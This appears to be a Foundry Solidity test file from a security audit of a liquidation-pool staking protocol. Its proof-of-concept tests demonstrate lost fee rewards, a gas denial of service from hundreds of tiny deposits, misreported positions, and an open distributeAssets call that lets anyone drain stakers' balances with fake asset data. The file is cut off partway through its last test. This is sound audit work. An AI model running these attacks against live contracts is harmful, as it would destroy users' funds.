// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Common, console2, LiquidationPool, SmartVaultV3 } from '../Common.t.sol';
import { ILiquidationPoolManager } from 'src/interfaces/ILiquidationPoolManager.sol';
import { ITokenManager } from 'src/interfaces/ITokenManager.sol';

contract Unit is Common {
    function setUp() public override {
        super.setUp();
    }

    // @audit-ok test passed
    function test_decreaseStakeCanCauseLossOfFeeReward() public {
        ////////////////////////////////////////////
        ///     Minting some tokens to users     ///
        ////////////////////////////////////////////

        uint amount = 1000 ether; // 1000 tokens

        tokens.eurosToken.mint(alice, amount * 2);
        tokens.eurosToken.mint(bob, amount * 2);

        tokens.tstToken.mint(alice, amount * 2);
        tokens.tstToken.mint(bob, amount * 2);

        /////////////////////////////////////////////////////////
        ///     Alice and Bob deposits tokens in the pool     ///
        /////////////////////////////////////////////////////////

        vm.startPrank(alice);
        tokens.tstToken.approve(address(contracts.liquidationPool), amount);
        tokens.eurosToken.approve(address(contracts.liquidationPool), amount);
        vm.stopPrank();

        vm.startPrank(bob);
        tokens.tstToken.approve(address(contracts.liquidationPool), amount);
        tokens.eurosToken.approve(address(contracts.liquidationPool), amount);
        vm.stopPrank();

        vm.prank(alice);
        contracts.liquidationPool.increasePosition(amount, amount);

        vm.prank(bob);
        contracts.liquidationPool.increasePosition(amount, amount);

        ////////////////////////////////////////////////////////////
        /////   Checking if correct value has been deposited   /////
        ////////////////////////////////////////////////////////////

        (LiquidationPool.Position memory alicePosition,) = contracts.liquidationPool.position(alice);
        (LiquidationPool.Position memory bobPosition,) = contracts.liquidationPool.position(bob);

        assertEq(alicePosition.EUROs, amount, "Alice's euros amount are not eqaul");
        assertEq(alicePosition.TST, amount, "Alice's TSTs amount are not eqaul");
        assertEq(bobPosition.EUROs, amount, "Bob's euros amount are not eqaul");
        assertEq(bobPosition.TST, amount, "Bob's TSTs amount are not eqaul");

        /////////////////////////////////////////////////////////
        ///     Skipping some time to consolidate stakes     ////
        /////////////////////////////////////////////////////////

        // NOTE: Actual consolidation will be done when someone increases or decreases their positions
        skip(block.timestamp + 1 weeks);

        /////////////////////////////////////////////////////////////////////////////
        ///     Alice and bob holds 1000 TST and EUROs Each in Pending Stakes     ///
        /////////////////////////////////////////////////////////////////////////////

        ////////////////////////////////////
        ///     Mike Creates a Vault     ///
        ////////////////////////////////////

        address mike = makeAddr('mike');
        (address mikesSmartVault, uint tokenIdMinted) = _createSmartVault(mike);

        //////////////////////////////////////////////////////////
        ///     Checking If Mike is the owner of the vault     ///
        //////////////////////////////////////////////////////////

        assertEq(contracts.smartVaultManagerV5.ownerOf(tokenIdMinted), mike, 'Mike is not the owner');

        ////////////////////////////////////////////////////////
        ///     Mike deposits some tokens in the vault    //////
        ////////////////////////////////////////////////////////

        vm.startPrank(mike);
        uint mikePaxgAmount = 1000 ether;
        tokens.paxgToken.mint(mike, mikePaxgAmount);
        tokens.paxgToken.transfer(mikesSmartVault, amount);
        vm.stopPrank();

        //////////////////////////////////////////////////////////////////////////////////
        ///     Checking if the correct balances has been transferred to the vault     ///
        //////////////////////////////////////////////////////////////////////////////////

        uint mikePaxgBalanceInVault = tokens.paxgToken.balanceOf(mikesSmartVault);

        assertEq(mikePaxgAmount, mikePaxgBalanceInVault, 'Balance is not equal');

        /////////////////////////////////////////////////////////////////////////////////////////////////////
        ///     Mike decides to mint some euros from the vault that generates some fees                   ///
        ///     feeGeneratedFromMint = (eurosMikeWant * constants.PROTOCOL_FEE_RATE) / 100000             ///
        ///     feeGenereatedFromMint = 500000000000000000000 * 500 / 100000                              ///
        ///     feeGeneratedFromMint =  2.5 ether (i.e 2.5 tokens)                                        ///
        ///     feeShareForPool = feeGeneratedFromMint * constants.POOL_FEE_PERCENTAGE) / 100000          ///
        ///     feeShareForPool =  2.5 ether * 50000 / 100000                                             ///
        ///     feeShareForPool =  1.25 ether  or 1250000000000000000                                     ///
        /////////////////////////////////////////////////////////////////////////////////////////////////////

        vm.startPrank(mike);
        uint eurosMikeWant = mikePaxgBalanceInVault / 2;
        SmartVaultV3(payable(mikesSmartVault)).mint(mike, eurosMikeWant);
        vm.stopPrank();

        /////////////////////////////////////////////////////////////////////////////////////////
        ///     Checking if the correct amount of euros has been minted from the vault     //////
        /////////////////////////////////////////////////////////////////////////////////////////

        uint mikeEurosBalance = tokens.eurosToken.balanceOf(mike);
        assertEq(mikeEurosBalance, eurosMikeWant, 'Balance is not equal');

        ///////////////////////////////////////////////////////////////////////////
        ///     There should be some euros fee in the liqudiationPoolManager    ///
        ///////////////////////////////////////////////////////////////////////////

        uint feeGenerated = (eurosMikeWant * constants.PROTOCOL_FEE_RATE) / 100_000;
        uint eurosFeeInLiquidationManager = tokens.eurosToken.balanceOf(address(contracts.liquidationPoolManager));
        assertEq(eurosFeeInLiquidationManager, feeGenerated, 'fee is not equal');
        assertEq(eurosFeeInLiquidationManager, 2.5 ether, 'fee is not equal');

        ///////////////////////////////////////////////////////////////////////////////////////////////////
        ///    Bob add more tokens to his positions. This time there is a fee                           ///
        ///    in the liquidationPoolManager that will be added to his stakes                           ///
        ///    Proporational to his stakes                                                              ///
        ///    Bob's fee share = feeShareForPool * (balance before the stake) / (Total TST balance)     ///
        ///    Bob's fee share = 1.25 ether * 1000 tokens / 2000 tokens (1000 bobs and 1000 alice's)    ///
        ///    Bob's fee share = 1250000000000000000 * 1000 / 2000 tokens                               ///
        ///    Bob's fee share = 0.625 euros   or  625000000000000000                                   ///
        ///////////////////////////////////////////////////////////////////////////////////////////////////

        (bobPosition,) = contracts.liquidationPool.position(bob);

        uint bobsFeeShare = ((eurosFeeInLiquidationManager * constants.POOL_FEE_PERCENTAGE / 100_000) * bobPosition.TST)
            / tokens.tstToken.balanceOf(address(contracts.liquidationPool));

        vm.startPrank(bob);
        tokens.eurosToken.approve(address(contracts.liquidationPool), amount);
        tokens.tstToken.approve(address(contracts.liquidationPool), amount);
        contracts.liquidationPool.increasePosition(amount, amount);
        vm.stopPrank();

        ////////////////////////////////////////////////////////////////////////////////////////////
        ///    Checking if the correct value has been deposited to the pool and bob's position   ///
        ////////////////////////////////////////////////////////////////////////////////////////////

        (bobPosition,) = contracts.liquidationPool.position(bob);
        assertEq(bobPosition.EUROs, amount * 2 + bobsFeeShare, "Bob's euros amount are not eqaul");
        assertEq(bobsFeeShare, 0.625 ether, "Bob's fee share is not equal");
        assertEq(bobPosition.TST, amount * 2, "Bob's TSTs amount are not eqaul");

        ////////////////////////////////////////////////////////////////////////////////////////
        ///     Bob now holds 1000 TSTs and 1000.0625 euros in consolidated stakes          ////
        ///     and 1000 TSTs and 1000 euros in pending stakes                              ////
        ////////////////////////////////////////////////////////////////////////////////////////

        ///////////////////////////////////////////////////////////////////////
        ///     Bob decides to withdraw his stake for some reason           ///
        ///     on same day. Since he deposited the tokens on the           ///
        ///     same day, he can only withdraw his consolidated stake.      ///
        ///     Bob's consolidated stake = 1000 Tst and 1000.0625 euros     ///
        ///     Since he is withdrawing all of his consolidated stake,      ///
        ///     his address will be removed from holders array.             ///
        ///////////////////////////////////////////////////////////////////////

        vm.startPrank(bob);
        contracts.liquidationPool.decreasePosition(amount, amount + 0.625 ether);
        vm.stopPrank();

        ////////////////////////////////////////////////////////////////////////////////
        ///     Checking bob's position. There is only balance in pending stakes     ///
        ///     Bob's consolidated stake = 0 Tst and 0 euros                         ///
        ///     Bob's pending stake = 1000 Tst and 1000 euros                        ///
        ////////////////////////////////////////////////////////////////////////////////

        (bobPosition,) = contracts.liquidationPool.position(bob);

        assertEq(bobPosition.EUROs, amount, "Bob's euros amount are not eqaul");
        assertEq(bobPosition.TST, amount, "Bob's euros amount are not eqaul");

        //////////////////////////////////////////////////////////////////////////////////////
        ///     Mike decides to mint some more tokens against his vault balances.          ///
        ///     More fee will be generated and added to the liquidationPoolManager         ///
        ///     feeGenereatedFromMint = 2.5 tokens (i.e because same amount is minted)     ///
        ///     feeShareForPool =  1.25 ether  or 1250000000000000000                      ///
        //////////////////////////////////////////////////////////////////////////////////////

        tokens.paxgToken.mint(mike, amount);
        vm.startPrank(mike);
        tokens.paxgToken.transfer(mikesSmartVault, amount);
        SmartVaultV3(payable(mikesSmartVault)).mint(mike, eurosMikeWant);
        vm.stopPrank();

        ///////////////////////////////////////////////////////////////////////////
        ///     Checking if correct balance has been deposited to the vault     ///
        ///////////////////////////////////////////////////////////////////////////

        mikePaxgBalanceInVault = tokens.paxgToken.balanceOf(mikesSmartVault);

        assertEq(
            mikePaxgAmount * 2, // because mike deposited 1000 tokens before
            mikePaxgBalanceInVault,
            'Balance is not equal'
        );

        ////////////////////////////////////////////////////
        ///     Checking if correct fee is generated     ///
        ///     Fee generated will be same as before     ///
        ///     as the amount minted is same             ///
        ////////////////////////////////////////////////////

        eurosFeeInLiquidationManager = tokens.eurosToken.balanceOf(address(contracts.liquidationPoolManager));

        assertEq(eurosFeeInLiquidationManager, feeGenerated, 'Balance is empty');
        assertEq(eurosFeeInLiquidationManager, 2.5 ether, 'Balance is empty');

        ///////////////////////////////////////////////////////////////////////////////
        ///     Getting bob's position to check if his amount shows the rewards     ///
        ///////////////////////////////////////////////////////////////////////////////

        (bobPosition,) = contracts.liquidationPool.position(bob);

        bobsFeeShare = ((eurosFeeInLiquidationManager * constants.POOL_FEE_PERCENTAGE / 100_000) * bobPosition.TST)
            / (tokens.tstToken.balanceOf(address(contracts.liquidationPool)));

        // NOTE: here the bobPosition.EUROs shows the wrong amount since there is a bug in position function. It is calculating fee
        // of staker based on the total balance of manager while pool is going to receive only percentage of the fee generated. Rest
        // will go to protocol address. In this case pool fee percentage is 50% so the amount shown by bobPosition.EUROs will be
        // twice the amount he will receive.

        assertEq(bobPosition.EUROs, amount + (0.625 ether * 2), "Bob's euros amount are not eqaul");
        assertEq(bobPosition.EUROs, amount + (bobsFeeShare * 2), "Bob's euros amount are not eqaul");
        assertEq(bobPosition.TST, amount, "Bob's euros amount are not eqaul");

        /////////////////////////////////////////////////////
        ///     Skipping some time to consolidate stakes  ///
        /////////////////////////////////////////////////////

        skip(block.timestamp + 1 weeks);

        ///////////////////////////////////////////////////////////////////////////////////////////
        ///     Since enough time has passed bob decides to withdraw rest of his amount.        ///
        ///     Also there is a fee in liquidationPoolManager that will be added to his         ///
        ///     stakes corresponding to his stake ratio.                                        ///
        ///     Bob's fee share = 0.625       (since both fee generated and stake is same)      ///
        ///////////////////////////////////////////////////////////////////////////////////////////

        vm.startPrank(bob);
        contracts.liquidationPool.decreasePosition(amount, amount);
        vm.stopPrank();

        /////////////////////////////////////////////////////////////////////////////////
        ///     Since bob has withdrawn all of his stakes excluding fee received,     ///
        ///     there should be amount equals to his fee share in the position.       ///
        ///     That means bob's position should be 0 TST and 0.625 euros             ///
        /////////////////////////////////////////////////////////////////////////////////

        (bobPosition,) = contracts.liquidationPool.position(bob);

        ///////////////////////////////////////////////////////////////////////////////////////////////////
        ///     But fee is not received since bob's address has been withdrawn from the holders array   ///
        ///     So his position should be 0 TST and 0 euros and all of the fee should have been         ///
        ///     transferred to alice                                                                    ///
        ///     (i.e 0.625 euros of first fee rewards and 1.25 euros of second fee reward)             ///
        ///////////////////////////////////////////////////////////////////////////////////////////////////

        assertEq(bobPosition.EUROs, 0, "Bob's euros amount is not zero");
        assertEq(bobPosition.TST, 0);

        (alicePosition,) = contracts.liquidationPool.position(alice);
        assertEq(alicePosition.EUROs, amount + (bobsFeeShare * 3), "Alice's euros amount are not eqaul");
    }

    // @audit-ok test passed
    function test_AttackerCanCauseDoSByMakingMultipleIncreasePostionCallAndFillingUpPendingStakes() public {
        ////////////////////////////////////////////
        ///                 Setup                ///
        ////////////////////////////////////////////

        uint pendingStakesLength = 600;
        uint amount = 1000 ether;

        /////////////////////////////////////////////////////////////////
        //      minting some tokens to alice for the transaction      ///
        /////////////////////////////////////////////////////////////////

        tokens.eurosToken.mint(alice, amount);
        tokens.tstToken.mint(alice, amount);

        /////////////////////////////////////////////////////////////////
        //      getting gas spent before the transaction              ///
        /////////////////////////////////////////////////////////////////

        uint gasBefore = gasleft();

        /////////////////////////////////////////////////////////////////
        //      alice stakes 600 times to fill up the pending array.  ///
        //      by increasing his position by 1 wei of tokens value.  ///
        //      The tx amount could be bigger as the protocol will    ///
        //      be deployed on arbitrum and gas fee will be           ///
        //      much cheaper as compared to ethereum.                 ///
        /////////////////////////////////////////////////////////////////

        vm.startPrank(alice);

        for (uint i = 0; i < pendingStakesLength; i++) {
            tokens.tstToken.approve(address(contracts.liquidationPool), 1);
            tokens.eurosToken.approve(address(contracts.liquidationPool), 1);
            contracts.liquidationPool.increasePosition(1, 1);
        }

        vm.stopPrank();

        /////////////////////////////////////////////////////////////////
        //      getting gas left after the transaction                ///
        /////////////////////////////////////////////////////////////////

        uint gasAfter = gasleft();

        /////////////////////////////////////////////////////////////////
        //      gas spent on the transaction                          ///
        /////////////////////////////////////////////////////////////////

        uint gasUsed = gasBefore - gasAfter;

        ///////////////////////////////////////////////////////////////////////////////////////////////////
        //      will be equal to 278253936. The amount will be very less if the transactions are        ///
        //      sent individually. This amount of gas will be equal to approx 62.2287 USD on Arbitrum.  ///
        //      calculated using this free tool:                                                        ///
        //      https://www.cryptoneur.xyz/en/gas-fees-calculator?gas-input=8025143628&gas-price-opti   ///
        ///////////////////////////////////////////////////////////////////////////////////////////////////
        console2.log('gas used to add all pending stakes: %s', gasUsed);

        ///////////////////////////////////////////////////////////////////
        //          skipping some time to consolidate stakes            ///
        ///////////////////////////////////////////////////////////////////

        skip(block.timestamp + 1 weeks);

        ///////////////////////////////////////////////////////////////////
        ///         Bob decides to increase his position.               ///
        ///         This will cause the transaction to revert           ///
        ///         due to out of Gas even if Max gas limit is set      ///
        ///////////////////////////////////////////////////////////////////

        tokens.eurosToken.mint(bob, amount);
        tokens.tstToken.mint(bob, amount);

        vm.startPrank(bob);
        tokens.tstToken.approve(address(contracts.liquidationPool), 1000 ether);
        tokens.eurosToken.approve(address(contracts.liquidationPool), 1000 ether);

        // NOTE: This is just the max block gas limit that I picked from the internet. It can be high or low. Even if it is high, the attack can still happen as the attacker can increase the count of the transactions and we already know that it will be very cheap as it will be on arbitrum.
        vm.expectRevert();
        contracts.liquidationPool.increasePosition{ gas: 30_000_000 }(amount, amount);
        vm.stopPrank();
    }

    // function just to calculate gas used to add pending stakes
    function test_increasePositionOnce() public {
        tokens.eurosToken.mint(alice, 1000 ether);
        tokens.tstToken.mint(alice, 1000 ether);

        // getting gas spent on the transaction
        uint gasBefore = gasleft();
        vm.startPrank(alice);
        tokens.tstToken.approve(address(contracts.liquidationPool), 1000 ether);
        tokens.eurosToken.approve(address(contracts.liquidationPool), 1000 ether);
        contracts.liquidationPool.increasePosition(1000 ether, 1000 ether);
        vm.stopPrank();
        uint gasAfter = gasleft();

        uint gasUsed = gasBefore - gasAfter;
        console2.log('gas used to add one pending stake: %s', gasUsed);
        console2.log('gas required to add 600 pending stakes: %s', gasUsed * 600);
    }

    // @audit-ok test passed
    function test_PositionFunctionReturnsIncorrectPositionOfStaker() public {
        //////////////////////////////////
        ///     Setup                  ///
        //////////////////////////////////

        uint amount = 1000 ether; // 1000 tokens

        ////////////////////////////////////////
        ///     Alice deposits in Pool       ///
        ////////////////////////////////////////

        tokens.tstToken.mint(alice, amount * 2);
        tokens.eurosToken.mint(alice, amount * 2);

        vm.startPrank(alice);
        tokens.tstToken.approve(address(contracts.liquidationPool), amount);
        tokens.eurosToken.approve(address(contracts.liquidationPool), amount);
        contracts.liquidationPool.increasePosition(amount, amount);
        vm.stopPrank();

        ///////////////////////////////////////
        ///     Bob creates smart Vault     ///
        ///////////////////////////////////////

        (address vault, uint tokenIdMinted) = _createSmartVault(bob);

        ////////////////////////////////////////////////////
        ///    checking if it is minted correctly        ///
        ////////////////////////////////////////////////////

        assertEq(contracts.smartVaultManagerV5.ownerOf(tokenIdMinted), bob, 'Bob is not the owner');

        ////////////////////////////////////////////////////
        ///     Bob deposits some tokens in the vault    ///
        ////////////////////////////////////////////////////

        tokens.arbToken.mint(bob, amount);

        vm.startPrank(bob);
        tokens.arbToken.transfer(vault, amount);
        vm.stopPrank();

        /////////////////////////////////////////////////////////
        ///     Checking If Bob's Vualt balance is correct    ///
        /////////////////////////////////////////////////////////

        uint bobArbBalanceInVault = tokens.arbToken.balanceOf(vault);

        assertEq(bobArbBalanceInVault, amount, 'Vault Balance is not correct');

        ////////////////////////////////////////////////////
        ///     Bob mints some euros from the vault      ///
        ////////////////////////////////////////////////////

        vm.startPrank(bob);
        uint eurosBobWant = 100 ether; // 100 euros
        SmartVaultV3(payable(vault)).mint(bob, eurosBobWant);
        vm.stopPrank();

        //////////////////////////////////////////////////////
        ///     Checking if the correct amount of euros    ///
        ///     has been minted from the vault             ///
        //////////////////////////////////////////////////////

        uint bobEurosBalance = tokens.eurosToken.balanceOf(bob);
        assertEq(bobEurosBalance, eurosBobWant, "Bob's Euro Balance is not correct");

        ////////////////////////////////////////////////////////////////////////
        ///     Checking if the correct fee is generated                     ///
        ///     feeGenerated = eurosBobWant * PROTOCOL_FEE_RATE / 100000     ///
        ///     feeGenerated = 100 * 500 / 100000                            ///
        ///     feeGenerated = 0.5 euros                                     ///
        ////////////////////////////////////////////////////////////////////////

        uint feeGenerated = (eurosBobWant * constants.PROTOCOL_FEE_RATE) / 100_000;
        uint expectedFeeGenerated = 0.5 ether; // 0.5 euros
        uint eurosFeeInLiquidationManager = tokens.eurosToken.balanceOf(address(contracts.liquidationPoolManager));

        assertEq(eurosFeeInLiquidationManager, feeGenerated, 'fee is not equal');
        assertEq(feeGenerated, expectedFeeGenerated, 'fee generated is not same');

        ///////////////////////////////////////////////////////
        ///     Skipping some time to consolidate rewards   ///
        ///////////////////////////////////////////////////////

        skip(block.timestamp + 3 days);

        ////////////////////////////////////////////////////////////////
        ///     Getting alice's position before fee is distributed   ///
        ////////////////////////////////////////////////////////////////

        (LiquidationPool.Position memory alicePosition,) = contracts.liquidationPool.position(alice);

        uint feeThatWillBeReceivedByAliceAccordingToPositionFunction = alicePosition.EUROs - amount;

        //////////////////////////////////////////////////////////////
        ///     alice deposits some more tokens to the pool        ///
        ///     this will consolidate the rewards and distribute   ///
        ///     the fee to alice                                   ///
        //////////////////////////////////////////////////////////////

        vm.startPrank(alice);
        tokens.tstToken.approve(address(contracts.liquidationPool), amount);
        tokens.eurosToken.approve(address(contracts.liquidationPool), amount);
        contracts.liquidationPool.increasePosition(amount, amount);
        vm.stopPrank();

        ////////////////////////////////////////////////////////////////
        ///     Getting alice's position after fee is distributed   ///
        ////////////////////////////////////////////////////////////////

        (alicePosition,) = contracts.liquidationPool.position(alice);

        uint feeActuallyReceivedByAlice = alicePosition.EUROs - (amount * 2);

        ////////////////////////////////////////////////////////////////
        ///     Checking if alice has received the correct fee       ///
        ////////////////////////////////////////////////////////////////

        vm.expectRevert();
        require(
            feeActuallyReceivedByAlice == feeThatWillBeReceivedByAliceAccordingToPositionFunction, 'fee is not equal'
        );

        // position function returned twice the fee since it does not take into account the pool fee percentage
        assertEq(
            feeActuallyReceivedByAlice * 2, feeThatWillBeReceivedByAliceAccordingToPositionFunction, 'fee is not equal'
        );
    }

    // @audit test Passed
    ILiquidationPoolManager.Asset[] public assets;

    function test_rewardsCannotBeClaimedFroRemovedTokensInLiquidationPool() public {
        ///////////////////////////////
        ///     Setup               ///
        ///////////////////////////////

        uint amount = 1000 ether;

        ///////////////////////////////////////////////////
        ///      minting some tokens to alice           ///
        ///////////////////////////////////////////////////

        tokens.eurosToken.mint(alice, amount);
        tokens.tstToken.mint(alice, amount);

        ///////////////////////////////////////////////
        ///      alice increases her stake          ///
        ///////////////////////////////////////////////

        vm.startPrank(alice);
        tokens.eurosToken.approve(address(contracts.liquidationPool), amount);
        tokens.tstToken.approve(address(contracts.liquidationPool), amount);
        contracts.liquidationPool.increasePosition(amount, amount);
        vm.stopPrank();

        //////////////////////////////////////////////////////
        //   alice's position should have been increased   ///
        //////////////////////////////////////////////////////

        (LiquidationPool.Position memory alicePosition, LiquidationPool.Reward[] memory rewards) =
            contracts.liquidationPool.position(alice);
        assertEq(alicePosition.EUROs, amount, "Alice's euros amount are not eqaul");
        assertEq(alicePosition.TST, amount, "Alice's tst amount are not equal");

        //////////////////////////////////////////////////////////
        ///      skipping some time to consolidate stakes      ///
        //////////////////////////////////////////////////////////

        skip(block.timestamp + 1 weeks);

        ////////////////////////////////////////////////////////////////////////
        //      minting some ARBs to the LiquidationPoolManger               ///
        ///     to represent the Liquidated assets                           ///
        ////////////////////////////////////////////////////////////////////////

        tokens.arbToken.mint(address(contracts.liquidationPoolManager), amount);
        tokens.paxgToken.mint(address(contracts.liquidationPoolManager), amount);

        /////////////////////////////////////////////////////////////////////////////
        ///    Mocking LiquidationPoolManager approving the LiquidationPool       ///
        ///    to spend the assets                                                ///
        /////////////////////////////////////////////////////////////////////////////

        vm.startPrank(address(contracts.liquidationPoolManager));
        tokens.arbToken.approve(address(contracts.liquidationPool), amount);
        tokens.paxgToken.approve(address(contracts.liquidationPool), amount);
        vm.stopPrank();

        ////////////////////////////////////////////////////////
        //           setting up data for mock call           ///
        ////////////////////////////////////////////////////////

        ILiquidationPoolManager.Asset[1] memory _assets;

        // setting arb token data
        _assets[0] = ILiquidationPoolManager.Asset(
            ITokenManager.Token({
                symbol: 'ARB',
                addr: address(tokens.arbToken),
                dec: 18,
                clAddr: address(priceFeeds.arbUsdPriceFeed),
                clDec: 8
            }),
            amount
        );

        assets.push(_assets[0]);

        /////////////////////////////////////////////////////////////////////////////
        //      mocking distribute asset call from the liquidationPoolManager     ///
        /////////////////////////////////////////////////////////////////////////////

        console2.log("> Alice's ARB tokens Balance before Distributing Rewards: %s\n", tokens.arbToken.balanceOf(alice));

        vm.startPrank(address(contracts.liquidationPoolManager));
        contracts.liquidationPool.distributeAssets(assets, uint(constants.DEFAULT_COLLATERAL_RATE), 100_000);
        vm.stopPrank();

        ////////////////////////////////////////////////////////////////////
        //      getting the position of alice after the liquidation      ///
        //      There should be rewards in ARBs token. Also the EURO     ///
        //      balance of the Alice should be 0 as the amount should    ///
        //      have been spent to buy the liquidated assets.            ///
        ////////////////////////////////////////////////////////////////////

        (alicePosition, rewards) = contracts.liquidationPool.position(alice);

        bool hasRewards;

        console2.log("> Alice's Rewards After liquidation: ");

        for (uint i; i < rewards.length; i++) {
            if (rewards[i].amount > 0) {
                console2.log('\tToken: %s', string(abi.encode(rewards[i].symbol)));
                console2.log('\tReward Earned: %s\n', rewards[i].amount);
                hasRewards = true;
            }
        }

        require(hasRewards, 'No rewards are earned by the staker');

        assertEq(alicePosition.EUROs, 0, 'Alice still has EUROs left');

        /////////////////////////////////////////////////////////////////////////////////////////
        //      Owner decides to remove arb token from the TokenManager                       ///
        //      and alice didn't claim her tokens rewards                                     ///
        /////////////////////////////////////////////////////////////////////////////////////////

        contracts.tokenManager.removeAcceptedToken(bytes32('ARB'));

        ///////////////////////////////////////////////////////////////////////////////////////
        ///     Getting alice's position to check if she still has any rewards.             ///
        ///     Should return no rewards as the previous rewards token has been removed     ///
        ///////////////////////////////////////////////////////////////////////////////////////

        (alicePosition, rewards) = contracts.liquidationPool.position(alice);

        console2.log("> Alice's Rewards After ARB Token Removal:");

        hasRewards = false;
        for (uint i; i < rewards.length; i++) {
            if (rewards[i].amount > 0) {
                console2.log("\tToken: %s", string(abi.encode(rewards[i].symbol)));
                console2.log('\tReward Earned: %s', rewards[i].amount);
                hasRewards = true;
            }
        }

        require(!hasRewards, 'No rewards are earned by the staker');

        if (!hasRewards) {
            console2.log('\tThere are No rewards for the staker\n');
        }

        ///////////////////////////////////////////////////////////////////////////
        ///     Alice decides to claim her rewards but will not get anything    ///
        ///     Her Arbs token balance will still be zero                       ///
        ///////////////////////////////////////////////////////////////////////////

        vm.startPrank(alice);
        contracts.liquidationPool.claimRewards();
        vm.stopPrank();

        console2.log("> Alice's ARB tokens Balance After Distributing Rewards And Claiming: %s", tokens.arbToken.balanceOf(alice));

        assertEq(tokens.arbToken.balanceOf(alice), 0, "There are ARBs token in Alice's account");
    }

    // @audit test passed
    function test_AnyOneCanManipulateTheLiquidationPoolBalancesOfStaker() public {
        ///////////////////////////////
        ///     Setup               ///
        ///////////////////////////////

        uint tstAmount = 100 ether;
        uint eurosAmount = 1000 ether;

        /////////////////////////////////////////////////
        ///      minting some tokens to bob           ///
        /////////////////////////////////////////////////

        tokens.eurosToken.mint(bob, eurosAmount);
        tokens.tstToken.mint(bob, tstAmount);       


        ////////////////////////////////////////////////////////////
        ///     Bob increases his stake with full amount         ///
        ////////////////////////////////////////////////////////////

        vm.startPrank(bob);
        tokens.eurosToken.approve(address(contracts.liquidationPool), eurosAmount);
        tokens.tstToken.approve(address(contracts.liquidationPool), tstAmount);
        contracts.liquidationPool.increasePosition(tstAmount, eurosAmount);
        vm.stopPrank();

        //////////////////////////////////////////////////////////////////////
        //   bob should have correct balance in his position               ///
        //////////////////////////////////////////////////////////////////////

        (LiquidationPool.Position memory bobPosition, LiquidationPool.Reward[] memory bobsRewards) =
            contracts.liquidationPool.position(bob);

        assertEq(bobPosition.EUROs, eurosAmount, "Bob's euros amount are not eqaul");
        assertEq(bobPosition.TST, tstAmount, "Bob's tst amount are not equal");

        //////////////////////////////////////////////////////////
        ///      skipping some time to consolidate stakes      ///
        //////////////////////////////////////////////////////////

        skip(block.timestamp + 1 weeks);


        //////////////////////////////////////////////////////////////////////////
        //           alice setting up data to call distribute asset.           ///
        //           she picked up most expensive price feed of assets         ///
        //           so that most harm is done to the stakers.                 ///
        //////////////////////////////////////////////////////////////////////////

        ILiquidationPoolManager.Asset[1] memory _assets;

        uint256 rewardsBalance = 1 ether; // will represent 1 wbtc
        _assets[0] = ILiquidationPoolManager.Asset(
            ITokenManager.Token({
                symbol: '', // necessary for the attack
                addr: address(0), // necessary for the attack
                dec: 18,
                clAddr: address(priceFeeds.wbtcUsdPriceFeed), // most epensive asset out of all accepted
                clDec: 8
            }),
            rewardsBalance
        );

        assets.push(_assets[0]);

        /////////////////////////////////////////////////////////////////////////////
        //      alice called distributeAsset with the fake asset data.            ///
        /////////////////////////////////////////////////////////////////////////////

        (bobPosition, bobsRewards) = contracts.liquidationPool.position(bob);

        console2.log("> Bob's EUROs balance Before fake liquidation: %s", bobPosition.EUROs);
        console2.log("> Bob's TST balance Before fake liquidation: %s", bobPosition.TST);

        vm.startPrank(alice);
        contracts.liquidationPool.distributeAssets(assets, uint(constants.DEFAULT_COLLATERAL_RATE), 100_000);
        vm.stopPrank();

        /////////////////////////////////////////////////////////////////////////
        //      getting the positions after the fake liquidation              ///
        //      There will be no rewards for any user as well as their        ///
        //      euro's will be spent by the fake amount and added as          ///
        //      a rewards for symbol: bytes32("") and address: staker         ///
        //      which is unclaimable as it's not valid data                   ///
        /////////////////////////////////////////////////////////////////////////

        (bobPosition, bobsRewards) = contracts.liquidationPool.position(bob);


        console2.log("> Bob's Rewards After fake liquidation: ");

        for (uint i; i < bobsRewards.length; i++) {
            console2.log('\tToken: %s', string(abi.encode(bobsRewards[i].symbol)));
            console2.log('\tReward Earned: %s', bobsRewards[i].amount);
        }
        console2.log('\n');
        console2.log("> Bob's EUROs balance After fake liquidation: %s", bobPosition.EUROs);
        console2.log("> Bob's TST balance After fake liquidation: %s", bobPosition.TST);

        ////////////////////////////////////////////////////
        ///     Bob tries to withdraw his stake          ///
        ///     but he can't as his euros balance is 0   ///
        ////////////////////////////////////////////////////

        vm.startPrank(bob);
        vm.expectRevert("invalid-decr-amount");
        contracts.liquidationPool.decreasePosition(tstAmount, eurosAmount);
        vm.stopPrank();

        /////////////////////////////////////////////////////
        ///     He also tries to claim his rewards        ///
        ///     but he can't as there will be no rewards  ///
        /////////////////////////////////////////////////////

        vm.startPrank(bob);
        contracts.liquidationPool.claimRewards();
        vm.stopPrank();

        (bobPosition, bobsRewards) = contracts.liquidationPool.position(bob);

        console2.log("> Bob's EUROs Balance after he claims his Rewards: %s", bobPosition.EUROs);
        console2.log("> Bob's TST Balance after he claims his Rewards: %s",bobPosition.TST);
    }

    function test_rewardsDistribution() public {
        ///////////////////////////////
        ///     Setup               ///
        ///////////////////////////////

        uint tstAmount = 100 ether;
        uint eurosAmount = 1000 ether;

        ///////////////////////////////////////////////////
        ///      minting some tokens to alice           ///
        ///////////////////////////////////////////////////

        tokens.eurosToken.mint(alice, eurosAmount);
        tokens.tstToken.mint(alice, tstAmount);

        ///////////////////////////////////////////////
        ///      alice increases her stake          ///
        ///////////////////////////////////////////////

        vm.startPrank(alice);
        tokens.eurosToken.approve(address(contracts.liquidationPool), eurosAmount);
        tokens.tstToken.approve(address(contracts.liquidationPool), tstAmount);
        contracts.liquidationPool.increasePosition(tstAmount, eurosAmount);
        vm.stopPrank();

        //////////////////////////////////////////////////////
        //   alice's position should have been increased   ///
        //////////////////////////////////////////////////////

        (LiquidationPool.Position memory alicePosition, LiquidationPool.Reward[] memory alicesRewards) =
            contracts.liquidationPool.position(alice);
        assertEq(alicePosition.EUROs, eurosAmount, "Alice's euros amount are not eqaul");
        assertEq(alicePosition.TST, tstAmount, "Alice's tst amount are not equal");

        //////////////////////////////////////////////////////////
        ///      skipping some time to consolidate stakes      ///
        //////////////////////////////////////////////////////////

        skip(block.timestamp + 1 weeks);

        ////////////////////////////////////////////////////////////////////////
        //      minting some ARBs to the LiquidationPoolManger               ///
        ///     to represent the Liquidated assets                           ///
        ////////////////////////////////////////////////////////////////////////
        uint256 rewardsBalance = 0.4 ether;
        tokens.arbToken.mint(address(contracts.liquidationPoolManager), rewardsBalance);
        tokens.paxgToken.mint(address(contracts.liquidationPoolManager), rewardsBalance);

        /////////////////////////////////////////////////////////////////////////////
